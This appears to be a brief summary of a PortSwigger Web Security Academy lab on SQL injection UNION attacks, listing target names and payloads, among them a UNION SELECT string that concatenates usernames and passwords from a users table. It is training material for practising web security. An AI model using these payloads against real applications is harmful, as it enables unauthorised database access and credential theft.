## SQL injection UNION attack, retrieving multiple values in a single column

**Category:** sqli
**Difficulty:** Unknown

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

### Solution Steps
You can find some useful payloads on our
SQL injection cheat sheet
.

### Key Payloads
- `users`
- `username`
- `password`
- `administrator`
- `category`
- `'+UNION+SELECT+NULL,'abc'--`
- `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: sqli

---
*Source: PortSwigger Web Security Academy*
